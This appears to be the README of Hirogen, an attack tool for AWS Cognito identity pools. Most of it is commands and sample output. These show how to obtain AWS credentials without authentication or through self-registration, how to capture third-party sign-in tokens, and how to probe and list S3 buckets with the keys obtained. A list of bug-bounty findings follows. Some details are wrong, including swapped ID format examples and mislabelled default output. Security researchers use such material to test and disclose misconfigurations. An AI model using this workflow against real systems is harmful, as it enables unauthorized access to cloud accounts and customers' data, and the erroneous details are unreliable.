# Hirogen

A federated identity attack tool for AWS Cognito.

## Quick Start:
Install the tool

```sh
git clone git@github.com:c6fc/hirogen.git
cd hirogen
npm install -g
```

Check for and recover unauthenticated credentials from Cognito User Pool:

```sh
hirogen get-unauthenticated us-west-2:ff6c3f28-fd22-402e-bee7-78b426522f99

[+] Credentials received. Your new identity is:
{
	...
}
```

Sometimes the Identity pool is set to block unauthenticated credentials
```sh
[*] Identity Pool exists, but unauthenticated credentials are not supported.
```

But that's OK! Check for and perform direct registration to Cognito User Pools:
```sh
hirogen check-clientid 3q47qusd82ot7nivggtl2ri6tf us-west-2_RXeMnFJo3
[+] This clientId allows direct registration!

hirogen register-user me@myema.il mYp@ssw0rd '{"phone":"+155551234567"}'
[+] Registration appears to have been successful. Subscriber: ff6c3f28-fd22-402e-bee7-78b426522f99
[*] You must validate your registration before you can log in. Use 'confirm-user' once you receive your code.
```

This means registration was successful, but that you need to verify your email. Check your email and get your verification code, and pass it to Hirogen:
```sh
hirogen confirm-user 123456
[+] Verification successful. You can now use 'login-user'
```

We'll now login and get creds for our user. Since we're using Cognito User pools, we specify 'cognito_idp' as the provider.
```sh
hirogen login-user
[+] Login successful.

hirogen get-credentials cognito_idp us-west-2:5e0d003d-f4bc-4768-8c4e-f589ba7559d0
[+] Credentials received. Your new identity is:
{
	...
}
```

## Support for multiple third-party identity providers

Hirogen can perform **page hollowing** to capture authentication tokens for Google Sign-in and Login with Amazon.

```sh
hirogen login-provider google 950667609206-oetjmj5buch3ekvjjd1mreptnaq3bjjp.apps.googleusercontent.com https://domain-with-google/sign-in.html
```

This pops open a Puppeteer browser window with a Google Sign-in prompt. After signing in, the window will close automatically, and you're ready to get credentials for this identity.

```
[+] Got google token

hirogen get-credentials google
[+] Credentials received. Your new identity is:
{
	...
}
```

## Using recovered credentials

Cool, you've got several ways to get the creds, but what do you do then?

For starters, try a quick permissions audit:
```sh
hirogen test-credentials cognito_idp
[-] ddb_ListTables
[-] ec2_DescribeInstances
[-] ec2_DescribeVPCEndpoints
[-] iam_ListRoles
[-] iam_ListUsers
[+] s3_ArbitaryWrite
[+] s3_ArbitraryListObjects
[+] s3_ArbitraryRead
[+] s3_ListBuckets
```

Looks like we have read, write, listObjects, and listBuckets! Let's inspect it! Using 'hirogen as <provider> <awscli commands...>' to pipe the credentials to the AWS CLI.
```sh
hirogen as cognito_idp s3 ls
2019-02-19 17:15:14 202-backup
2019-04-15 13:39:10 aws-training
2016-09-16 09:24:14 bio.myresume.com
2017-03-18 11:49:54 breakingbad
2017-06-11 20:53:18 callmemaybe
2016-09-15 16:18:41 dayinthelife-prod
2017-10-26 01:51:00 devpipeline-cicd
```

```sh
hirogen as cognito_idp s3 ls 202-backup
                 PRE server-backup/
```

## Using Workspaces
Hirogen stashes useful information persistently in a *workspace*. The default workspace is called 'hirogen', but you can create a new workspace and switch between them easily:

```sh
hirogen use c6fc
[+] Creating new empty workspace [c6fc]
[+] Workspace [c6fc] set as active

hirogen show c6fc
{ ... workspace contents ... }
```

Workspaces are all stored as plaintext JSON files in `~/.hirogen/`

## Parameter persistence and reuse
Interactions with Cognito require LOTS of parameters. Hirogen simplifies these interactions by using a natural workflow that tracks when a particular parameter succeeded in earlier calls, and uses them in subsequent ones. This means that if you follow a sensible approach, you can provide all these parameters piecemeal as you make your way through:

```sh
                       | --clientid |             | --userpoolid |
hirogen check-clientid 3q47qusd82ot7nivggtl2ri6tf us-west-2_RXeMnFJo3
[+] This clientId allows direct registration! # this client id and user pool are valid, so they are saved in the workspace.

                     | --username | | --password|
hirogen register-user me@myema.il    mYp@ssw0rd  # --clientid and --userpoolid are also required, but pulled from the workspace.
[+] Registration appears to have been successful. # Since it was a success, username and password are now also persisted

hirogen login-user # this requires all four of the above, which are all populated from the workspace.
[+] Login successful. # In the back-end, the login token is now saved to the workspace

                        | --provider | | --identitypoolid |
hirogen get-credentials cognito_idp    us-west-2:5e0d003d-f4bc-4768-8c4e-f589ba7559d0
[+] Credentials received. Your new identity is... # Now --provider and --identitypoolid are saved, along with the AWS keys!
```

Alternatively, you can jump straight to the command you want, as long as you provide all the necessary parameters:
```sh
hirogen register-user --username me@myema.il --password mYp@ssw0rd --clientid 3q47qusd82ot7nivggtl2ri6tf --userpoolid us-west-2_RXeMnFJo3
[+] Registration appears to have been successful. # now all four are saved!

hirogen login-user # the same four are now populated from the workspace
[+] Login successful.
```

If you forget (or just haven't run a prior command in this workspace yet) Hirogen will remind you:

```sh
hirogen login-user
[-] --clientid is required. Consider the command check-clientid <clientid> <userpoolid> to populate the workspace.
[-] --userpoolid is required. Consider the command check-clientid <clientid> <userpoolid> to populate the workspace.
```

## Setting defaults for subsequent campaigns
Hirogen lets you set reusable defaults to help speed up interactions across multiple workspaces. Defaults apply to Cognito Username, Password, Attributes, and Authflow.

```sh
hirogen set-default username me@mye.mailme@myema.il
[+] Set default username to [me@myema.il mYp@ssw0rd]

hirogen set-default password mYp@ssw0rd
[+] Set default username to [mYp@ssw0rd]

hirogen register-user
[+] Registration appears to have been successful. Subscriber: ff6c3f28-fd22-402e-bee7-78b426522f99

hirogen login-user
[+] Login successful.
```

Defaults are persisted in the 'core' storage, which can be inspected:

```sh
hirogen core
{
    "last_workspace": "c6fc",
    "defaults": {
        "username": "me@mye.mailme@myema.il",
        "password": "mYp@ssw0rd",
        "authflow": "USER_SRP_AUTH",
        "attributes": ""
    }
}
```

## Locating Cognito parameters
Most parameters used by Cognito and third-party auth sources have a pretty distinct convention, which can help when trying to locate the values you need to pass into Hirogen. Here's an example list:

--clientid: `<region>_[a-zA-Z0-9]{9}` e.g.: us-west-2_RXeMnFJo3  
--userpoolid: `[a-z0-9]{26}` e.g.: 3q47qusd82ot7nivggtl2ri6tf  
--identitypoolid: `<region>:<uuid>` e.g.: us-west-2:5e0d003d-f4bc-4768-8c4e-f589ba7559d0 # Note that Identity IDs and Identity Pool IDs both use this format.

Google Auth Tokens: `[0-9]{12}-[0-9a-z]{32}.apps.googleusercontent.com`  
Amazon AppID: `amzn1.application-oa2-client.[0-9a-f]{32}`


## Bug Bounties & Kudos

* A major manufacturer website exposed customer data: $3,000 paid
* A reputation management company exposed customer data, with writeable CI/CD pipeline and static site assets: Kudos
* A lifestyle and media company front-end Kubernetes cluster was accessible: Kudos
* A restaurant franchise website's static assets were modifiable: Kudos
* A staffing agency exposed applicant resumes: Kudos
* A gaming enthusiast website's static assets and leaderboards were modifiable: Kudos
* A celebrity's personal website allowed read-write to videos in s3: Kudos
* A psychology organization exposed training and example materials to self-registered cognito users: Kudos
* An AWS account belonging to an individual granted AdministratorAccess to self-registered Cognito users: Fixed, unacknowledged
* A clothing designer exposed order and customer information with modifiable CI/CD pipeline assets: Fixed, unacknowledged


Dozens of others have been notified but have not responded.